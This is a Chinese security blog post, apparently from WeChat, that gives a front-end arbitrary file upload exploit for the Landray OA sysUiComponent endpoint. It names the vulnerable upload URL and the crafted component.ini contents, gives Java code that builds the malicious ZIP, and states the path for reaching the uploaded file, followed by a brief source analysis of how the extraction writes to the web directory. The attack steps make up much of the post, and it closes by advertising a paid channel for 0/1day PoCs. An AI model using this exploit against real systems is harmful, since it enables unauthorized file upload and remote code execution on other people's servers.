#  蓝凌 sysUiComponent 前台任意文件上传

原创 Pan3a  [ 安全绘景 ](javascript:void\(0\);)

**安全绘景** ![]()

微信号 gh_a4e19e42a2aa

功能介绍 致力于0/1day、红队攻防、渗透实战等研究和分享，在这你可以收获到一些poc、技巧。欢迎师傅们来扰，祝愿师傅们天天高危！

____

___发表于_

收录于合集

###
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责。

## 漏洞利用

  * 前台RCE

  * 出现如下情况则可能存在漏洞

  * `sys/ui/sys_ui_component/sysUiComponent.do?method=upload`

![]()

  * 制作恶意ZIP

  * 这里的`component.ini`和`hello.txt`是自己要创建好文件的，`hello.txt`为上传内容

  * 以下为`component.ini`文件内容，`id`值为上传后路径,`name`值为上传后文件名

    
    
    id=2023  
    name=hello.txt
    
    
    import org.apache.tools.zip.ZipEntry;  
    import org.apache.tools.zip.ZipOutputStream;  
      
    import java.io.*;  
    import java.util.zip.ZipException;  
      
    public class SysUiComponent {  
        public static void main(String[] args) {  
            String[] filesToZip = {"component.ini", "hello.txt"};  
            String zipFileName = "compressed.zip";  
      
            try {  
                zipFiles(filesToZip, zipFileName);  
                System.out.println("Files zipped successfully.");  
            } catch (Exception e) {  
                e.printStackTrace();  
            }  
        }  
      
        public static void zipFiles(String[] filesToZip, String zipFileName) throws IOException, ZipException {  
            try (FileOutputStream fos = new FileOutputStream(zipFileName);  
                 ZipOutputStream zipOut = new ZipOutputStream(fos)) {  
      
                for (String fileToZip : filesToZip) {  
                    File file = new File(fileToZip);  
                    if (file.exists()) {  
                        addToZip(file, file.getName(), zipOut);  
                    }  
                }  
            }  
        }  
      
        private static void addToZip(File file, String entryName, ZipOutputStream zipOut) throws IOException {  
            try (FileInputStream fis = new FileInputStream(file)) {  
                ZipEntry zipEntry = new ZipEntry(entryName);  
                zipOut.putNextEntry(zipEntry);  
      
                byte[] buffer = new byte[8192];  
                int bytesRead;  
                while ((bytesRead = fis.read(buffer)) != -1) {  
                    zipOut.write(buffer, 0, bytesRead);  
                }  
            }  
        }  
    }

  * 将生成的zip文件在上图箭头处上传即可。

![]()

  * 访问路径`resource/ui-component/` \+ `id`值 + `name`值

![]()

## 漏洞分析

  * 源码大概如下

![]()

  * 跟进`checkExtend`方法

![]()

  * 大致含义是获取上传的文件名和内容，将文件保存在一个随机命名的zip文件。

![]()

![]()

  * 接着继续向下看，这里对保存的zip文件进行解压，这里可能想到如致远的文件解压漏洞导致RCE。但是跟进去发现这里不允许`../`和`..\`进行跳转，若仅禁止前者，还可以使用后者进行跳转（局限Windows）。继续向下看发现解压之后必须要存在`component.ini`文件，并且该文件必须包含`id`和`name`值，最终返回一个JSON数据。

![]()

    
    
        private String getAppFolder(String extendId) {        return ConfigLocationsUtil.getWebContentPath() + "/" + "resource/ui-component" + "/" + extendId;    }

  * 将`extendId`值拼接到Web路径，并将解压的文件复制到该路径从而造成漏洞。

  

推广一波自己的星球：

安全绘景：持续更新0/1day的poc、红队技巧、实战文章、实用工具等资源，欢迎各位师傅来扰，不满意直接退款。最后祝愿各位师傅天天高危！

![]()

![]()

预览时标签不可点

微信扫一扫  
关注该公众号

轻触阅读原文

继续滑动看下一个

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

